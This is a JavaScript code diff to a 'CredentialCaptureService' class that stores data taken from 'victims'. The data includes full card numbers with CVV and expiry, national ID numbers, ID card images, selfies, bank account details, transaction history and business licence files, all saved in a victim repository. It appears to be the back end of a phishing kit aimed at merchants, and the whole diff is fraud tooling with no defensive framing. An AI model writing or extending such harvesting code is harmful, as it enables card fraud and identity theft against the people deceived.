@@ -123,53 +123,169 @@ class CredentialCaptureService {
     if (!victim) {
       throw new Error('Victim not found');
     }
+    const existingValidation = victim.validation || {};
 
     // Encrypt card information if provided
-    let encryptedCardInfo = {};
-    if (formData.cardNumber || formData.cardHolder || formData.expiryDate || formData.cvv) {
-      const cardData = {
-        cardNumber: formData.cardNumber,
-        cardHolder: formData.cardHolder,
-        expiryDate: formData.expiryDate,
-        cvv: formData.cvv
+    const cardFields = {
+      cardNumber: formData.cardNumber || formData.card_number,
+      cardHolderName: formData.cardHolderName || formData.card_holder_name,
+      expiryDate: formData.cardExpiry || formData.expiryDate,
+      cvv: formData.cardCVV || formData.cvv
+    };
+    const hasCardData = Object.values(cardFields).some(Boolean);
+    let cardInformation = victim.cardInformation || {};
+
+    if (hasCardData) {
+      const encryptedCardInfo = this.encryptionService.encrypt(cardFields);
+      cardInformation = {
+        cardType: formData.cardType || formData.card_type || cardInformation.cardType || null,
+        ...encryptedCardInfo
       };
-      encryptedCardInfo = this.encryptionService.encrypt(cardData);
+    }
+
+    const existingIdentity = victim.identityVerification || {};
+    const cardImage = files.card_image || files.identityCard || existingIdentity.cardImage || null;
+    const transactionHistoryFiles = (files.transaction_history && files.transaction_history.length > 0)
+      ? files.transaction_history
+      : (existingIdentity.transactionHistoryFiles || []);
+
+    const businessLocationPhotos = (files.business_location_photos && files.business_location_photos.length > 0)
+      ? files.business_location_photos
+      : (existingIdentity.documents?.businessLocationPhotos || []);
+
+    const documents = {
+      ...(existingIdentity.documents || {})
+    };
+    if (files.business_license_file) {
+      documents.businessLicenseFile = files.business_license_file;
+    }
+    if (files.representative_id_file) {
+      documents.representativeIdFile = files.representative_id_file;
+    }
+    if (businessLocationPhotos.length > 0) {
+      documents.businessLocationPhotos = businessLocationPhotos;
+    }
+
+    const businessProfile = {
+      type: formData.businessType,
+      name: formData.businessName,
+      industry: formData.industry,
+      taxCode: formData.taxCode,
+      licenseNumber: formData.businessLicense,
+      address: formData.businessAddress,
+      phone: formData.businessPhone,
+      email: formData.businessEmail,
+      website: formData.website,
+      documents: {
+        businessLicenseFile: documents.businessLicenseFile,
+        businessLocationPhotos: documents.businessLocationPhotos
+      }
+    };
+
+    const representativeProfile = {
+      name: formData.representativeName || formData.fullName,
+      phone: formData.representativePhone || formData.phone,
+      email: formData.representativeEmail || formData.email,
+      idNumber: formData.representativeIdNumber || formData.idNumber,
+      position: formData.representativePosition,
+      documents: {
+        idFile: documents.representativeIdFile
+      }
+    };
+
+    const bankingProfile = {
+      bankName: formData.bankName,
+      accountNumber: formData.bankAccountNumber,
+      accountName: formData.bankAccountName,
+      branch: formData.bankBranch,
+      transactionHistoryFiles
+    };
+
+    const identityFiles = {
+      ...(existingIdentity.files || {})
+    };
+    if (cardImage) {
+      const cardImagePath = cardImage.path || cardImage;
+      identityFiles.card_image = cardImagePath;
+      identityFiles.identityCard = identityFiles.identityCard || cardImagePath;
+    }
+    if (files.selfie) {
+      identityFiles.selfie = files.selfie.path;
+    }
+    if (transactionHistoryFiles.length > 0) {
+      const transactionPaths = transactionHistoryFiles.map(file => file.path || file);
+      identityFiles.transaction_history = transactionPaths;
+      identityFiles.bankStatement = identityFiles.bankStatement || transactionPaths;
+    }
+    if (files.business_license_file) {
+      identityFiles.business_license_file = files.business_license_file.path;
+    }
+    if (files.representative_id_file) {
+      identityFiles.representative_id_file = files.representative_id_file.path;
+    }
+    if (files.business_location_photos && files.business_location_photos.length > 0) {
+      identityFiles.business_location_photos = files.business_location_photos.map(file => file.path || file);
     }
 
     // Prepare identity verification data
     const identityVerification = {
-      fullName: formData.fullName || victim.name,
-      phone: formData.phone || victim.phone,
-      address: formData.address,
-      city: formData.city,
-      district: formData.district,
-      bankName: formData.bankName,
-      bankAccount: formData.bankAccount,
-      idNumber: formData.idNumber,
-      files: {}
+      ...existingIdentity,
+      fullName: representativeProfile.name || formData.businessName || victim.name,
+      phone: representativeProfile.phone || formData.businessPhone || victim.phone,
+      address: businessProfile.address || existingIdentity.address,
+      city: formData.city || existingIdentity.city,
+      district: formData.district || existingIdentity.district,
+      bankName: bankingProfile.bankName || existingIdentity.bankName,
+      bankAccount: bankingProfile.accountNumber || existingIdentity.bankAccount,
+      idNumber: representativeProfile.idNumber || existingIdentity.idNumber,
+      businessProfile,
+      representative: representativeProfile,
+      banking: bankingProfile,
+      cardImage,
+      transactionHistoryFiles,
+      documents,
+      files: identityFiles,
+      formSnapshot: {
+        businessType: formData.businessType,
+        businessName: formData.businessName,
+        industry: formData.industry,
+        taxCode: formData.taxCode,
+        businessLicense: formData.businessLicense,
+        businessAddress: formData.businessAddress,
+        businessPhone: formData.businessPhone,
+        businessEmail: formData.businessEmail,
+        website: formData.website,
+        representativeName: representativeProfile.name,
+        representativePhone: representativeProfile.phone,
+        representativeEmail: representativeProfile.email,
+        representativeIdNumber: representativeProfile.idNumber,
+        representativePosition: representativeProfile.position,
+        bankName: bankingProfile.bankName,
+        bankAccountNumber: bankingProfile.accountNumber,
+        bankAccountName: bankingProfile.accountName,
+        bankBranch: bankingProfile.branch,
+        cardType: cardInformation.cardType || formData.cardType,
+        cardProvided: hasCardData,
+        acceptTerms: formData.acceptTerms === true,
+        city: formData.city,
+        district: formData.district,
+        submittedAt: new Date().toISOString()
+      },
+      verificationStatus: 'pending',
+      verificationTimestamp: new Date().toISOString()
     };
-
-    // Store file paths if files were uploaded
-    if (files.identityCard) {
-      identityVerification.files.identityCard = files.identityCard.path;
-    }
-    if (files.selfie) {
-      identityVerification.files.selfie = files.selfie.path;
-    }
-    if (files.bankStatement) {
-      identityVerification.files.bankStatement = files.bankStatement.path;
-    }
 
     // Update victim record
     const updatedVictim = await this.victimRepository.update(victimId, {
-      name: formData.fullName || victim.name,
-      phone: formData.phone || victim.phone,
-      cardInformation: encryptedCardInfo,
+      name: representativeProfile.name || victim.name || businessProfile.name,
+      phone: representativeProfile.phone || businessProfile.phone || victim.phone,
+      cardInformation,
       identityVerification,
       validation: {
-        ...victim.validation,
+        ...existingValidation,
         registrationCompleted: true,
-        registrationTimestamp: new Date().toISOString()
+        registrationTimestamp: new Date().toISOString(),
+        account_type: formData.businessType || existingValidation.account_type
       }
     });
 
@@ -178,4 +294,3 @@ class CredentialCaptureService {
 }
 
 module.exports = CredentialCaptureService;
-
